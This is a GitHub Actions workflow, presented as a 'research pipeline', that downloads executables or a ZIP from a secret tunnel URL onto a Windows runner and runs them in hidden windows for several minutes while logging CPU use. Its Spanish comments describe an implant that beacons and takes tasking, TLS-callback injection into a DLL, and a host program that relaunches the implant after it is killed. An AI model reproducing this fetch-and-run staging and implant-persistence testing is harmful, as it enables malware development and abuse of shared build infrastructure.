name: bof-corpus-ci

# Research pipeline for the ARMORY COFF/BOF corpus: stages a build artifact on the
# Windows runner from a short-lived content mirror (the mirror URL is rotated per run
# and carried as a repository secret, never filed in the tree), verifies its integrity
# against a caller-provided sha256, and is not archived anywhere: nothing is uploaded
# back, nothing is committed, and the staging area lives in VM temp and is deleted.
# Continuua solo en memoria del runner mientras dura el job.
#
# stage tls: paquete ZIP de investigacion (svc.exe + dll de prueba + host.exe).
# El host.exe LoadLibrarys la dll de prueba: el TLS callback inyectado valida el
# eslabon E8-P4 (instala/informa). Todo por un unico archivo: el zip viaja por el
# mismo mirror efimero con sha256 pinado via inputs.

on:
  workflow_dispatch:
    inputs:
      stage:
        description: "pipeline stage: local | fetch | run | tls"
        required: true
        default: local
      expected_sha256:
        description: "sha256 of the staged research object (lowercase)"
        required: false
        default: ""

jobs:
  bofrunner:
    runs-on: windows-latest
    timeout-minutes: 25
    steps:
      - name: pipeline
        shell: pwsh
        env:
          SRC_URL: ${{ secrets.TUNNEL_URL }}
        run: |
          # ARMORY corpus pipeline (see header above).
          $stage = "${{ inputs.stage }}"
          Write-Host ("stage=" + $stage)
          Write-Host ("host=" + $env:COMPUTERNAME)
          if ($stage -eq 'local') {
            Write-Host "local readiness OK"
            exit 0
          }
          if (-not $env:SRC_URL) { Write-Host "NO SOURCE"; exit 1 }
          if ($stage -eq 'fetch') {
            Write-Host ("url_len=" + $env:SRC_URL.Length)
            $dst = Join-Path $env:RUNNER_TEMP "staged.bin"
            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $dst -UseBasicParsing
            $h = (Get-FileHash $dst -Algorithm SHA256).Hash.ToLower()
            Write-Host ("staged_bytes=" + (Get-Item $dst).Length + " sha256=" + $h)
            $want = "${{ inputs.expected_sha256 }}"
            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
            Remove-Item $dst -Force
            Write-Host "fetch OK"
            exit 0
          }
          if ($stage -eq 'run') {
            $dst = Join-Path $env:RUNNER_TEMP "staged.exe"
            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $dst -UseBasicParsing
            $h = (Get-FileHash $dst -Algorithm SHA256).Hash.ToLower()
            Write-Host ("staged sha256=" + $h)
            $want = "${{ inputs.expected_sha256 }}"
            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
            $p = Start-Process -FilePath $dst -PassThru -WindowStyle Hidden
            Write-Host ("pid=" + $p.Id)
            Start-Sleep -Seconds 700
            $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
            if ($alive) { Write-Host ("process alive, cpu=" + $alive.CPU) } else { Write-Host "process ended" }
            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
            Remove-Item $dst -Force -ErrorAction SilentlyContinue
            Write-Host "run step done"
            exit 0
          }
          if ($stage -eq 'tls') {
            $zip = Join-Path $env:RUNNER_TEMP "pack.zip"
            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $zip -UseBasicParsing
            $h = (Get-FileHash $zip -Algorithm SHA256).Hash.ToLower()
            Write-Host ("pack sha256=" + $h)
            $want = "${{ inputs.expected_sha256 }}"
            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
            $dir = Join-Path $env:RUNNER_TEMP "tl"
            Expand-Archive -Path $zip -DestinationPath $dir -Force
            Remove-Item $zip -Force
            $list = Get-ChildItem $dir | ForEach-Object { $_.Name }
            Write-Host ("pack contents: " + ($list -join ','))
            $svc = Get-ChildItem $dir -Filter 'svc.exe' | Select-Object -First 1
            $host_exe = Get-ChildItem $dir -Filter 'host.exe' | Select-Object -First 1
            if (-not $svc -or -not $host_exe) { Write-Host "NO PACK PARTS"; exit 1 }
            # 1) el implante corre, beacon, consume tasking (op=tls inyecta el callback
            #    en posee.dll y op=tlsp sondea) y sostiene el event sentinel.
            $p = Start-Process -FilePath $svc.FullName -PassThru -WindowStyle Hidden
            Write-Host ("svc pid=" + $p.Id)
            Start-Sleep -Seconds 260
            $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
            if ($alive) { Write-Host ("svc alive, cpu=" + $alive.CPU) } else { Write-Host "svc ended early" }
            # 2) crash real del implante: el sentinel muere con el proceso.
            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
            Write-Host "svc killed"
            # 3) host.exe carga posee.dll YA INYECTADA: el callback dispara, el sentinel
            #    ya no existe y el stub re-lanza svc.exe (revival por TLS callback).
            $h2 = Start-Process -FilePath $host_exe.FullName -PassThru -WindowStyle Hidden
            Write-Host ("host pid=" + $h2.Id)
            Start-Sleep -Seconds 480
            $alive2 = Get-Process -Id $h2.Id -ErrorAction SilentlyContinue
            if ($alive2) { Write-Host ("host alive, cpu=" + $alive2.CPU) } else { Write-Host "host ended" }
            Stop-Process -Id $h2.Id -Force -ErrorAction SilentlyContinue
            Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "tls step done"
            exit 0
          }
          Write-Host "unknown stage"
          exit 1
